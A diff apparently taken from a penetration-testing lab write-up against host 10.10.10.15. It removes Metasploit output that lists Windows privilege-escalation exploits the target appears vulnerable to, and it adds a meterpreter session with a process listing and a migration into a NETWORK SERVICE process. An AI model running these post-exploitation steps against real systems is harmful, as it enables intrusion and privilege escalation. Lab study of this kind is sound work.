@@ -1,12 +1,46 @@
+meterpreter > ps
 
-meterpreter > run post/multi/recon/local_exploit_suggester
+Process List
+============
 
-[*] 10.10.10.15 - Collecting local exploits for x86/windows...
-[*] 10.10.10.15 - 34 exploit checks are being tried...
-nil versions are discouraged and will be deprecated in Rubygems 4
-[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
-[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
-[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
-[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
-[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
-[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 272   4     smss.exe                                                        
+ 324   272   csrss.exe                                                       
+ 348   272   winlogon.exe                                                    
+ 396   348   services.exe                                                    
+ 400   1080  cidaemon.exe                                                    
+ 408   348   lsass.exe                                                       
+ 592   396   svchost.exe                                                     
+ 684   396   svchost.exe                                                     
+ 740   396   svchost.exe                                                     
+ 768   396   svchost.exe                                                     
+ 804   396   svchost.exe                                                     
+ 940   396   spoolsv.exe                                                     
+ 968   396   msdtc.exe                                                       
+ 1080  396   cisvc.exe                                                       
+ 1136  396   svchost.exe                                                     
+ 1184  396   inetinfo.exe                                                    
+ 1216  1080  cidaemon.exe                                                    
+ 1220  396   svchost.exe                                                     
+ 1320  1080  cidaemon.exe                                                    
+ 1332  396   VGAuthService.exe                                               
+ 1412  396   vmtoolsd.exe                                                    
+ 1464  396   svchost.exe                                                     
+ 1604  396   svchost.exe                                                     
+ 1816  396   alg.exe                                                         
+ 1832  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1896  396   dllhost.exe                                                     
+ 2308  592   wmiprvse.exe                                                    
+ 2680  348   logon.scr                                                       
+ 3200  1464  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 3268  3200  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 3272  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 3408  1464  w3wp.exe                                                        
+ 4068  592   davcdata.exe                                                    
+
+meterpreter > migrate  1832
+[*] Migrating from 3268 to 1832...
+[*] Migration completed successfully.
